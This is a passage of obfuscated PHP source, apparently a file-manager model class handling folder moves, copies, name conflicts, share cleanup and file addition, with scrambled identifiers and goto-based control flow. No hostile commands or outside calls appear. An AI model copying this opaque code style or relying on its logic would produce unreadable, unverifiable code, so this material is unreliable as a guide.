($d¹·ˆíÏ‹[$Dœ‹›é˜Ô[412]] == $Dœ‹›é˜Ô[97]) { $this->_childrenListAll($a¹è¦†‰æÔ, $f™½§ÕÁ˜÷); } } } private function sourceInfoCache($f˜á¨É›¯Â) { if (isset($this->_childrenItemCache[$f˜á¨É›¯Â])) { return $this->_childrenItemCache[$f˜á¨É›¯Â]; } return $this->sourceInfo($f˜á¨É›¯Â); } private function _childrenList($f±£…ç«ÆÖ) { if (isset($this->_childrenListCache[$f±£…ç«ÆÖ])) { return $this->_childrenListCache[$f±£…ç«ÆÖ]; } return $this->_childrenListSelect($f±£…ç«ÆÖ); } private function _childrenListSelect($bÀ¹¾ÁÌáÙ) { goto bª„øõÙ¤ñ; dáçá¼è…¹: foreach ($AëÈÑËóàµ as $bÀ¹¾ÁÌáÙ => $b´ÕÁ¬âƒğ) { $this->_childrenItemCache[$bÀ¹¾ÁÌáÙ] = $b´ÕÁ¬âƒğ; } return $AëÈÑËóàµ; goto FÀÖöÅ‚½˜; bª„øõÙ¤ñ: $B‰ ¬ï„Ğ• =& $_SERVER[Ü˜]; $fÌÛŒè¹ ñ = array($B‰ ¬ï„Ğ•[487] => $bÀ¹¾ÁÌáÙ, $B‰ ¬ï„Ğ•[432] => $this->targetIsDelete); $e¢ÌŞÕ§Û = $this->where($fÌÛŒè¹ ñ)->select(); goto C„Á†áª£; C„Á†áª£: $e¢ÌŞÕ§Û = $e¢ÌŞÕ§Û ? $e¢ÌŞÕ§Û : array(); $AëÈÑËóàµ = array_to_keyvalue($e¢ÌŞÕ§Û, $B‰ ¬ï„Ğ•[404]); $this->_childrenListCache[$bÀ¹¾ÁÌáÙ] = $AëÈÑËóàµ; goto dáçá¼è…¹; FÀÖöÅ‚½˜: } private function fileNameExistCache($bö¤Ÿóğİ…, $bé‚„‰õÅ´) { $c™Šãğ‘ğœ =& $_SERVER[Ü˜]; $bé‚„‰õÅ´ = strtolower($bé‚„‰õÅ´); $A¾†µªõåé = $this->_childrenList($bö¤Ÿóğİ…); foreach ($A¾†µªõåé as $bØšè¼×¬×) { if ($bé‚„‰õÅ´ == strtolower($bØšè¼×¬×[$c™Šãğ‘ğœ[28]])) { return $bØšè¼×¬×[$c™Šãğ‘ğœ[404]]; } } return !1; } private function fileNameAutoCache($DÓØ¤ÏÊÉÒ, $BÖ¯æ°Û³Š, $aá®†„·˜Ğ, $b¤É—ç˜‘í) { $dÂšæÏ‹˜„ =& $_SERVER[Ü˜]; $DÑª©¤Áô = $this->_childrenList($DÓØ¤ÏÊÉÒ); $f‡Ò½Äíä¯ = array_to_keyvalue($DÑª©¤Áô, $dÂšæÏ‹˜„[33], $dÂšæÏ‹˜„[28]); return $this->fileNameAutoGet($f‡Ò½Äíä¯, $BÖ¯æ°Û³Š, $aá®†„·˜Ğ, $b¤É—ç˜‘í); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b‰Èã¿ë®•, $cñÃÚ›˜·Ã, $c®Òôà±¶â = REPEAT_REPLACE, $C²Ÿ‹°¸ = '') { goto eù¦ÇµïÅË; cì‡˜·˜ˆ¦: $this->lockMoveEnd($b‰Èã¿ë®•); $this->lockWriteEnd($cñÃÚ›˜·Ã, $dË¾¤”×Š); $this->folderSizeReset($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[487]]); goto e¼•¥ÇÆÈ; eù¦ÇµïÅË: $AµÖŒÖä•Ä =& $_SERVER[Ü˜]; $eÓÖÍŠÚÄè = $this->sourceInfo($b‰Èã¿ë®•); $cããáä„‘‰ = $this->sourceInfo($cñÃÚ›˜·Ã); goto açÂµä‚‡‘; e¢éÓÜÀ°¢: $this->updateModifyTime($D…•²‚¸¢); Model($AµÖŒÖä•Ä[542])->eventMove($b‰Èã¿ë®•, $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[487]], $cñÃÚ›˜·Ã); Hook::trigger($AµÖŒÖä•Ä[568], $E†ˆ›÷­ó¡); goto bˆì¤…ãŠ‚; bˆì¤…ãŠ‚: return $e¢‚æ‹ôª; goto D¾¨ŸôÖ½î; B¬ŸìªÃŸ•: if ($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[412]] == $AµÖŒÖä•Ä[97] && $B„»ÆÌèĞ§) { $this->folderSizeResetChildren($e¢‚æ‹ôª); } Model($AµÖŒÖä•Ä[203])->linkAdd($DÇóë“·×[$AµÖŒÖä•Ä[538]]); if ($B„»ÆÌèĞ§ && $DÇóë“·×[$AµÖŒÖä•Ä[569]]) { $this->removeNow($b‰Èã¿ë®•, !1); } goto cì‡˜·˜ˆ¦; f¼Š…öÒò—: $this->lockWriteStart($cñÃÚ›˜·Ã, $dË¾¤”×Š); $DÇóë“·× = array($AµÖŒÖä•Ä[538] => array(), $AµÖŒÖä•Ä[569] => !1); $this->clearShare($b‰Èã¿ë®•, $cñÃÚ›˜·Ã); goto AœŒ‡Ş‡ì‹; fÉ‹Ó…ò: if (!$eÓÖÍŠÚÄè || !$cããáä„‘‰ || $cããáä„‘‰[$AµÖŒÖä•Ä[412]] != $AµÖŒÖä•Ä[97]) { return !1; } Hook::trigger($AµÖŒÖä•Ä[567], $E†ˆ›÷­ó¡); $this->targetIsDelete = intval($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[432]]); goto AŠÎê¶ÑáÕ; AŠÎê¶ÑáÕ: if ($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[487]] == $cñÃÚ›˜·Ã && $C²Ÿ‹°¸ != $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[28]]) { $fİ–ñ°ØŒ© = $this->fileNameExist($cñÃÚ›˜·Ã, $C²Ÿ‹°¸); if ($fİ–ñ°ØŒ© && $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[412]] == $AµÖŒÖä•Ä[201]) { goto eì¥ß”»İÕ; cÎÜòÉšÍ: return $fİ–ñ°ØŒ©; goto c’©É™–ô; eì¥ß”»İÕ: $F“ÕÕ¼—Î = $this->sourceInfo($fİ–ñ°ØŒ©); $bˆÍ¼ëÆˆË = $this->fileHistory($F“ÕÕ¼—Î, $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[456]], $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[88]]); if (!$bˆÍ¼ëÆˆË) { Model($AµÖŒÖä•Ä[459])->remove($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[456]]); } goto aÙ‘İŸáâ; aÙ‘İŸáâ: $this->removeNow($b‰Èã¿ë®•, !1); $this->folderSizeReset($cñÃÚ›˜·Ã); Hook::trigger($AµÖŒÖä•Ä[568], $E†ˆ›÷­ó¡); goto cÎÜòÉšÍ; c’©É™–ô: } } $dË¾¤”×Š = $C²Ÿ‹°¸ ? $C²Ÿ‹°¸ : $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[28]]; $this->lockMoveStart($b‰Èã¿ë®•); goto f¼Š…öÒò—; açÂµä‚‡‘: if ($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[487]] == $cããáä„‘‰[$AµÖŒÖä•Ä[404]]) { if ($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[432]] == $AµÖŒÖä•Ä[97]) { Model($AµÖŒÖä•Ä[430])->restore(array($b‰Èã¿ë®•)); } if (!$C²Ÿ‹°¸ || $C²Ÿ‹°¸ == $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[28]]) { return $b‰Èã¿ë®•; } } $E†ˆ›÷­ó¡ = $this->pathInfoMore($b‰Èã¿ë®•); if ($this->isParentOf($b‰Èã¿ë®•, $cñÃÚ›˜·Ã)) { return !1; } goto fÉ‹Ó…ò; AœŒ‡Ş‡ì‹: $B„»ÆÌèĞ§ = $this->fileNameExistCache($cñÃÚ›˜·Ã, $eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[28]]); $e¢‚æ‹ôª = $this->_move($b‰Èã¿ë®•, $cñÃÚ›˜·Ã, $c®Òôà±¶â, $DÇóë“·×, $C²Ÿ‹°¸); $this->sourceCacheClear(); goto B¬ŸìªÃŸ•; e¼•¥ÇÆÈ: $this->folderSizeReset($cñÃÚ›˜·Ã); $D…•²‚¸¢ = array($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[487]], $cñÃÚ›˜·Ã); if ($eÓÖÍŠÚÄè[$AµÖŒÖä•Ä[412]] == $AµÖŒÖä•Ä[97]) { $D…•²‚¸¢[] = $b‰Èã¿ë®•; } goto e¢éÓÜÀ°¢; D¾¨ŸôÖ½î: } private function _move($EíÉ§›ÍÏ, $dÅÇøã«Êí, $FºœĞª×¾, &$b±™Æ¡àÚÃ, $C”¸‹È‹… = '') { goto D†Ê¬Ùİœ; b¨µèåÇÊ®: return $E¨‚ç‰İÏ; goto D„…‘Úô‹‚; D†Ê¬Ùİœ: $eˆÖ²ñ¼ŸÉ =& $_SERVER[Ü˜]; $CÜÛÄ©º³ª = $this->sourceInfo($EíÉ§›ÍÏ); $fæîë¸¯ = $CÜÛÄ©º³ª[$eˆÖ²ñ¼ŸÉ[412]] == $eˆÖ²ñ¼ŸÉ[97]; goto b·–âËÈ¢’; b·–âËÈ¢’: $Dµ´Ÿ»Œ³Ï = $C”¸‹È‹… ? $C”¸‹È‹… : $CÜÛÄ©º³ª[$eˆÖ²ñ¼ŸÉ[28]]; $b™ÌÎÔãåÆ = $this->fileNameExistCache($dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï); $this->lockMoveStart($EíÉ§›ÍÏ); goto E–Ò®…§Í„; E–Ò®…§Í„: $this->lockWriteStart($dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï); if (!$b™ÌÎÔãåÆ) { return $this->_moveForce($EíÉ§›ÍÏ, $dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï); } $E¨‚ç‰İÏ = $b™ÌÎÔãåÆ; goto EÇïô¾«É³; EÇïô¾«É³: $C•×øëö” = !1; if ($fæîë¸¯) { if ($FºœĞª×¾ == REPEAT_RENAME_FOLDER) { $Dµ´Ÿ»Œ³Ï = $this->fileNameAuto($dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï, $FºœĞª×¾, $fæîë¸¯); $E¨‚ç‰İÏ = $this->_moveForce($EíÉ§›ÍÏ, $dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï); } else { if ($FºœĞª×¾ == REPEAT_RENAME_FOLDER) { $FºœĞª×¾ = REPEAT_RENAME; } $B…§İÇô– = $this->_childrenListSelect($EíÉ§›ÍÏ); foreach ($B…§İÇô– as $aË½°°¸¦¶) { $this->_move($aË½°°¸¦¶[$eˆÖ²ñ¼ŸÉ[404]], $b™ÌÎÔãåÆ, $FºœĞª×¾, $b±™Æ¡àÚÃ); } $C•×øëö” = !0; } } else { if ($FºœĞª×¾ == REPEAT_SKIP) { $C•×øëö” = !0; } else { if ($FºœĞª×¾ == REPEAT_RENAME || $FºœĞª×¾ == REPEAT_RENAME_FOLDER) { $Dµ´Ÿ»Œ³Ï = $this->fileNameAuto($dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï, $FºœĞª×¾, $fæîë¸¯); $E¨‚ç‰İÏ = $this->_moveForce($EíÉ§›ÍÏ, $dÅÇøã«Êí, $Dµ´Ÿ»Œ³Ï); } else { if ($FºœĞª×¾ == REPEAT_REPLACE) { $e›ˆæ°¦‡© = $this->sourceInfoCache($b™ÌÎÔãåÆ); $eÒ‚˜Œç¤” = $this->fileHistory($e›ˆæ°¦‡©, $CÜÛÄ©º³ª[$eˆÖ²ñ¼ŸÉ[456]], $CÜÛÄ©º³ª[$eˆÖ²ñ¼ŸÉ[88]]); if ($eÒ‚˜Œç¤”) { $b±™Æ¡àÚÃ[$eˆÖ²ñ¼ŸÉ[538]][] = $CÜÛÄ©º³ª[$eˆÖ²ñ¼ŸÉ[456]]; } else { $C•×øëö” = !0; } } } } } if ($C•×øëö” && !$b±™Æ¡àÚÃ[$eˆÖ²ñ¼ŸÉ[569]]) { $b±™Æ¡àÚÃ[$eˆÖ²ñ¼ŸÉ[569]] = !0; } goto b¨µèåÇÊ®; D„…‘Úô‹‚: } private function _moveForce($EÄ—ãÉ„öâ, $c½Ÿ‘¯âøË, $D‘º¹Ô›Èˆ) { goto fãÂçë¢ˆØ; fãÂçë¢ˆØ: $FƒçßËøêÛ =& $_SERVER[Ü˜]; $D¯ •ùé¿Ã = $this->sourceInfo($EÄ—ãÉ„öâ); $BæùˆÇŠ = $this->sourceInfo($c½Ÿ‘¯âøË); goto FĞ°ëîƒÒ—; FĞ°ëîƒÒ—: $FÂ¼ç÷¼ßÌ = $D¯ •ùé¿Ã[$FƒçßËøêÛ[412]] == $FƒçßËøêÛ[97]; $a¬‹˜ğŸ¬´ = array($FƒçßËøêÛ[403] => $BæùˆÇŠ[$FƒçßËøêÛ[404]], $FƒçßËøêÛ[562] => $BæùˆÇŠ[$FƒçßËøêÛ[496]] . $BæùˆÇŠ[$FƒçßËøêÛ[404]] . $FƒçßËøêÛ[47], $FƒçßËøêÛ[558] => $BæùˆÇŠ[$FƒçßËøêÛ[413]], $FƒçßËøêÛ[559] => $BæùˆÇŠ[$FƒçßËøêÛ[493]], $FƒçßËøêÛ[561] => USER_ID, $FƒçßËøêÛ[422] => $D‘º¹Ô›Èˆ); $DÌƒ‚–âã¾ = $D¯ •ùé¿Ã[$FƒçßËøêÛ[413]] == SourceModel::TYPE_GROUP && $BæùˆÇŠ[$FƒçßËøêÛ[413]] == SourceModel::TYPE_GROUP && $D¯ •ùé¿Ã[$FƒçßËøêÛ[493]] == $BæùˆÇŠ[$FƒçßËøêÛ[493]]; goto C…ÛÜÃŒ‚“; C…ÛÜÃŒ‚“: if (!$DÌƒ‚–âã¾ && $this->moveClearAuth) { Model($FƒçßËøêÛ[491])->authClear($EÄ—ãÉ„öâ); } $cÖ»¾¯°Œ = $D¯ •ùé¿Ã[$FƒçßËøêÛ[432]] == $FƒçßËøêÛ[97] && $BæùˆÇŠ[$FƒçßËøêÛ[432]] != $FƒçßËøêÛ[97]; if ($cÖ»¾¯°Œ) { $a¬‹˜ğŸ¬´[$FƒçßËøêÛ[431]] = 0; } goto bÜ‘Çî²Ü²; bÜ‘Çî²Ü²: if ($FÂ¼ç÷¼ßÌ) { $EñÆç¼÷¸Õ = array($FƒçßËøêÛ[562] => array($FƒçßËøêÛ[521], $D¯ •ùé¿Ã[$FƒçßËøêÛ[496]] . $D¯ •ùé¿Ã[$FƒçßËøêÛ[404]] . $FƒçßËøêÛ[522])); $cÑàİÄÓßì = $D¯ •ùé¿Ã[$FƒçßËøêÛ[496]] . $D¯ •ùé¿Ã[$FƒçßËøêÛ[404]] . $FƒçßËøêÛ[47]; $f²”†õİ‚ = $BæùˆÇŠ[$FƒçßËøêÛ[496]] . $BæùˆÇŠ[$FƒçßËøêÛ[404]] . $FƒçßËøêÛ[47] . $D¯ •ùé¿Ã[$FƒçßËøêÛ[404]] . $FƒçßËøêÛ[47]; $C¼«Æİ¼ä = array($FƒçßËøêÛ[562] => array($FƒçßËøêÛ[570], "\x72\145\160\154\x61\143\145\x28\x70\141\x72\145\156\164\x4c\145\x76\x65\154\54\47{$cÑàİÄÓßì}\47\x2c\x27{$f²”†õİ‚}\x27\51"), $FƒçßËøêÛ[558] => $BæùˆÇŠ[$FƒçßËøêÛ[413]], $FƒçßËøêÛ[559] => $BæùˆÇŠ[$FƒçßËøêÛ[493]]); if ($cÖ»¾¯°Œ) { $C¼«Æİ¼ä[$FƒçßËøêÛ[431]] = 0; } $this->where($EñÆç¼÷¸Õ)->data($C¼«Æİ¼ä)->save(); } $this->where(array($FƒçßËøêÛ[419] => $EÄ—ãÉ„öâ))->data($a¬‹˜ğŸ¬´)->save(); return $EÄ—ãÉ„öâ; goto bšß¼¹‰È; bšß¼¹‰È: } private function clearShare($B¡†š‡Úïò, $Fø©ÏÏòå) { goto f–é£öÀâ›; A®”×‡šÈº: if ($C®Üë™Šê[$FÒÚäÍ¢±«[493]] == $f¯‹‡Î‰[$FÒÚäÍ¢±«[493]] && $C®Üë™Šê[$FÒÚäÍ¢±«[413]] == $FÒÚäÍ¢±«[571]) { return; } $A‘¾™·Ó† = array($FÒÚäÍ¢±«[496] => array($FÒÚäÍ¢±«[521], $C®Üë™Šê[$FÒÚäÍ¢±«[496]] . $B¡†š‡Úïò . $FÒÚäÍ¢±«[522])); $C³ÚåËÔì‚ = $this->field($FÒÚäÍ¢±«[419])->where($A‘¾™·Ó†)->getField($FÒÚäÍ¢±«[404], !0); goto a›Êù•×¤Û; díÄ–†»õš: if (!$AÙ¥•ÙÉè–) { return; } $AÙ¥•ÙÉè– = array_to_keyvalue($AÙ¥•ÙÉè–, $FÒÚäÍ¢±«[33], $FÒÚäÍ¢±«[477]); $A‘¾™·Ó† = array($FÒÚäÍ¢±«[477] => array($FÒÚäÍ¢±«[7], $AÙ¥•ÙÉè–)); goto Eß°Ù»µ¨Œ; Eß°Ù»µ¨Œ: Model($FÒÚäÍ¢±«[572])->where($A‘¾™·Ó†)->save(array($FÒÚäÍ¢±«[484] => 0)); Model($FÒÚäÍ¢±«[573])->where($A‘¾™·Ó†)->delete(); goto F«ÔŠÌà¹Æ; f–é£öÀâ›: $FÒÚäÍ¢±« =& $_SERVER[Ü˜]; $C®Üë™Šê = $this->sourceInfo($B¡†š‡Úïò); $f¯‹‡Î‰ = $this->sourceInfo($Fø©ÏÏòå); goto A®”×‡šÈº; a›Êù•×¤Û: if (!$C³ÚåËÔì‚) { return; } $A‘¾™·Ó† = array($FÒÚäÍ¢±«[404] => array($FÒÚäÍ¢±«[7], $C³ÚåËÔì‚), $FÒÚäÍ¢±«[484] => 1); $AÙ¥•ÙÉè– = Model($FÒÚäÍ¢±«[572])->field($FÒÚäÍ¢±«[477])->where($A‘¾™·Ó†)->select(); goto díÄ–†»õš; F«ÔŠÌà¹Æ: } public function copyFolderFromIO($F¨ÇÉ»Öƒ, $Eµ“ô³¯®À, $AÁÏæÃò‰, $eåñ±øÅßğ, $e·ƒ³µùœÏ, $A„ÜŠ®ÌŸ¼ = false) { goto CÃ¡Üˆ; Bá‡Ö„îÃ: Hook::trigger($a›æ¹ÍÎöË[576]); if ($Dß×³Ô) { $this->folderSizeResetChildren($Dß×³Ô); } $this->_childrenListClear(); goto Cí÷ÎŞŒô³; Cí÷ÎŞŒô³: Model($a›æ¹ÍÎöË[541])->addAll($CÀã§”Å¬[$a›æ¹ÍÎöË[539]], array(), !0); Model($a›æ¹ÍÎöË[542])->eventCopy($Dß×³Ô); $this->saveAll($CÀã§”Å¬[$a›æ¹ÍÎöË[540]]); goto F‚¦Äµ§Ï‰; CÃ¡Üˆ: $a›æ¹ÍÎöË =& $_SERVER[Ü˜]; $CÀã§”Å¬ = array($a›æ¹ÍÎöË[539] => array(), $a›æ¹ÍÎöË[540] => array(), $a›æ¹ÍÎöË[538] => array(), $a›æ¹ÍÎöË[574] => array()); $fß†ˆÇ” æ = $A„ÜŠ®ÌŸ¼ ? $A„ÜŠ®ÌŸ¼ : $F¨ÇÉ»Öƒ->pathThis($Eµ“ô³¯®À); goto CËš¬Ùçõ›; bÏÂ‡ã™Â×: $this->updateModifyTime($AÁÏæÃò‰); return $Dß×³Ô; goto FèÁéŒóÒ½; CËš¬Ùçõ›: $BÂŒ™’¤Ï“ = $this->fileNameExist($AÁÏæÃò‰, $fß†ˆÇ” æ); $Dß×³Ô = $this->mkdir($AÁÏæÃò‰, $fß†ˆÇ” æ, $eåñ±øÅßğ); if (!$BÂŒ™’¤Ï“ || $eåñ±øÅßğ == REPEAT_RENAME_FOLDER) { $eåñ±øÅßğ = !1; } goto AŸ“É‰˜¶; AŸ“É‰˜¶: if ($BÂŒ™’¤Ï“) { $this->_childrenAllMake($BÂŒ™’¤Ï“); } Hook::trigger($a›æ¹ÍÎöË[575]); $this->_copyChildTo($F¨ÇÉ»Öƒ, $Eµ“ô³¯®À, $Dß×³Ô, $eåñ±øÅßğ, $CÀã§”Å¬, $e·ƒ³µùœÏ); goto Bá‡Ö„îÃ; F‚¦Äµ§Ï‰: Model($a›æ¹ÍÎöË[459])->linkAdd($CÀã§”Å¬[$a›æ¹ÍÎöË[538]]); Model($a›æ¹ÍÎöË[459])->remove($CÀã§”Å¬[$a›æ¹ÍÎöË[574]]); $this->folderSizeReset($AÁÏæÃò‰); goto bÏÂ‡ã™Â×; FèÁéŒóÒ½: } private function _copyChildTo($aêéÃ†­§Ò, $Bªµ»çŒ†¢, $a´šéİÃÕä, $FªØÎ‡Ä‰ì, &$EµÏ£…µ¨ß, $dî§ñ…Ûœ) { goto BŸ¨”®Ã; bñè«àéÚâ: if (!empty($b•öÜ‘«¿…)) { $this->addAll($b•öÜ‘«¿…); $this->_childrenListSelect($a´šéİÃÕä); } $fªÔ¶´æÊ“ = $this->_childrenList($a´šéİÃÕä); $fªÔ¶´æÊ“ = array_to_keyvalue($fªÔ¶´æÊ“, $cöÄìÛê‚„[28]); goto b°Øˆµõ¯…; bÁ‹æÊÙ¸: $b•öÜ‘«¿… = array(); foreach ($Fã·İ¢Û·„ as &$B¬ÌÓÊ¸–Õ) { goto E¹¿‡†ßš; cÅîˆÁƒ—¹: $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[88]] = _get($B¬ÌÓÊ¸–Õ, $cöÄìÛê‚„[88], 0); $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]] = _get($B¬ÌÓÊ¸–Õ, $cöÄìÛê‚„[456], 0); if (!isset($B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[577]]) && $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]]) { $EµÏ£…µ¨ß[$cöÄìÛê‚„[574]][] = $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]]; } goto a¤ª¸ ò²³; a¤ª¸ ò²³: if ($FªØÎ‡Ä‰ì) { $fâäİãê¯‰ = $this->fileNameExistCache($a´šéİÃÕä, $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]]); if ($fâäİãê¯‰) { if ($B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[412]] || $FªØÎ‡Ä‰ì == REPEAT_SKIP) { continue; } if ($FªØÎ‡Ä‰ì == REPEAT_REPLACE) { $C¾«éƒ‰† = $this->sourceInfoCache($fâäİãê¯‰); $BâÀ±„º = $this->fileHistory($C¾«éƒ‰†, $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]], $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[88]]); if ($BâÀ±„º) { $EµÏ£…µ¨ß[$cöÄìÛê‚„[538]][] = $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]]; } continue; } else { if ($FªØÎ‡Ä‰ì == REPEAT_RENAME) { $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]] = $this->fileNameAutoCache($a´šéİÃÕä, $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]], $FªØÎ‡Ä‰ì, !1); } } } } if (!$B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[412]] && $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]]) { $EµÏ£…µ¨ß[$cöÄìÛê‚„[538]][] = $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[456]]; } $b•öÜ‘«¿…[] = $this->_makeItemData($B¬ÌÓÊ¸–Õ, $CğÖ‡Ÿî“â, $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]]); goto DáŸ·³¸ù­; E¹¿‡†ßš: if (isset($DôÇõİÍé™[$B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]]])) { $B¬ÌÓÊ¸–Õ = $DôÇõİÍé™[$B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]]]; } $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[412]] = $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[29]] == $cöÄìÛê‚„[87]; $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[414]] = _get($B¬ÌÓÊ¸–Õ, $cöÄìÛê‚„[178], $cöÄìÛê‚„[33]); goto cÅîˆÁƒ—¹; DáŸ·³¸ù­: } unset($B¬ÌÓÊ¸–Õ); goto bñè«àéÚâ; dåØ¶Œîğí: $A¡ã‚ÅÉ‹ = $A¡ã‚ÅÉ‹ ? $A¡ã‚ÅÉ‹ : array($cöÄìÛê‚„[84] => array(), $cöÄìÛê‚„[85] => array()); $Fã·İ¢Û·„ = array_merge($A¡ã‚ÅÉ‹[$cöÄìÛê‚„[84]], $A¡ã‚ÅÉ‹[$cöÄìÛê‚„[85]]); $DôÇõİÍé™ = $this->_addFiles($aêéÃ†­§Ò, $A¡ã‚ÅÉ‹[$cöÄìÛê‚„[84]], $dî§ñ…Ûœ); goto bÁ‹æÊÙ¸; b°Øˆµõ¯…: foreach ($Fã·İ¢Û·„ as $B¬ÌÓÊ¸–Õ) { $C¾«éƒ‰† = $fªÔ¶´æÊ“[$B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[28]]]; $Aó¥ÆÃÏø = $C¾«éƒ‰†[$cöÄìÛê‚„[404]]; $this->_copyApplyMeta($C¾«éƒ‰†, $EµÏ£…µ¨ß); if ($B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[29]] == $cöÄìÛê‚„[87]) { $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[86]] = $aêéÃ†­§Ò->getPathInner($B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[86]]); $this->_copyChildTo($aêéÃ†­§Ò, $B¬ÌÓÊ¸–Õ[$cöÄìÛê‚„[86]], $Aó¥ÆÃÏø, $FªØÎ‡Ä‰ì, $EµÏ£…µ¨ß, $dî§ñ…Ûœ); } } goto D’‰¨ÆÏªÑ; BŸ¨”®Ã: $cöÄìÛê‚„ =& $_SERVER[Ü˜]; $CğÖ‡Ÿî“â = $this->sourceInfoCache($a´šéİÃÕä); $A¡ã‚ÅÉ‹ = $aêéÃ†­§Ò->listPath($Bªµ»çŒ†¢); goto dåØ¶Œîğí; D’‰¨ÆÏªÑ: } private function _addFiles($bê®¬†÷›, $D¥Ë°¦«ô¹, $eƒ»éŒ¾£) { goto B‹ÃœÈÈÛ; cÖÙ×èëĞ¡: foreach ($Bç×ÌöĞòÎ as $EëğÂ”šÛ) { if (!isset($cÎ‚°ÈëÅß[$EëğÂ”šÛ[$AŠƒöÚ»¹[180]]])) { continue; } $fĞÉÔƒ÷Ï = $cÎ‚°ÈëÅß[$EëğÂ”šÛ[$AŠƒöÚ»¹[180]]]; foreach ($fĞÉÔƒ÷Ï as &$Fê‘¦ÅäÈ”) { $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[456]] = $EëğÂ”šÛ[$AŠƒöÚ»¹[456]]; $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[577]] = !0; } unset($Fê‘¦ÅäÈ”); } $F‚§Û®İËª = array(); foreach ($D¥Ë°¦«ô¹ as $AâÉÔÏÑœí) { if (isset($AâÉÔÏÑœí[$AŠƒöÚ»¹[577]]) && $AâÉÔÏÑœí[$AŠƒöÚ»¹[577]]) { continue; } $eäëÙº† = $bê®¬†÷›->getPathInner($AâÉÔÏÑœí[$AŠƒöÚ»¹[86]]); $DÌ‚¾‹–Øç = $dÜÔÖ‰³÷é->addFileMake($eäëÙº†, $AâÉÔÏÑœí[$AŠƒöÚ»¹[88]], $AâÉÔÏÑœí[$AŠƒöÚ»¹[181]], $AâÉÔÏÑœí[$AŠƒöÚ»¹[180]], $AâÉÔÏÑœí[$AŠƒöÚ»¹[28]], $eƒ»éŒ¾£); $F‚§Û®İËª[] = $DÌ‚¾‹–Øç; } goto b…í‰Ö›„†; b…í‰Ö›„†: $dÜÔÖ‰³÷é->addAll($F‚§Û®İËª); $cÈÍŠ‰–§· = array($AŠƒöÚ»¹[180] => array($AŠƒöÚ»¹[7], array_keys($cÎ‚°ÈëÅß))); $Bç×ÌöĞòÎ = $dÜÔÖ‰³÷é->where($cÈÍŠ‰–§·)->select(); goto cÀÁøİ½Ü; dà™®†İÆÕ: $dÜÔÖ‰³÷é = Model($AŠƒöÚ»¹[580]); $Bç×ÌöĞòÎ = $dÜÔÖ‰³÷é->where($cÈÍŠ‰–§·)->select(); $Bç×ÌöĞòÎ = $Bç×ÌöĞòÎ ? $Bç×ÌöĞòÎ : array(); goto cÖÙ×èëĞ¡; B‹ÃœÈÈÛ: $AŠƒöÚ»¹ =& $_SERVER[Ü˜]; if (!$D¥Ë°¦«ô¹ || count($D¥Ë°¦«ô¹) == 0) { return array(); } $cÎ‚°ÈëÅß = array(); goto AË¢Ó¥Ãš; cÀÁøİ½Ü: $Bç×ÌöĞòÎ = $Bç×ÌöĞòÎ ? $Bç×ÌöĞòÎ : array(); foreach ($Bç×ÌöĞòÎ as $EëğÂ”šÛ) { if (!isset($cÎ‚°ÈëÅß[$EëğÂ”šÛ[$AŠƒöÚ»¹[180]]])) { continue; } $FÆá¡™ŒÀÚ =& $cÎ‚°ÈëÅß[$EëğÂ”šÛ[$AŠƒöÚ»¹[180]]]; foreach ($FÆá¡™ŒÀÚ as &$Fê‘¦ÅäÈ”) { $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[456]] = $EëğÂ”šÛ[$AŠƒöÚ»¹[456]]; } unset($Fê‘¦ÅäÈ”); } $cİ§®À«çª = array(); goto E½«˜«Ç»; E½«˜«Ç»: foreach ($D¥Ë°¦«ô¹ as $bÔÛŠÆƒÂ§) { $cİ§®À«çª[$bÔÛŠÆƒÂ§[$AŠƒöÚ»¹[28]]] = $bÔÛŠÆƒÂ§; } return $cİ§®À«çª; goto 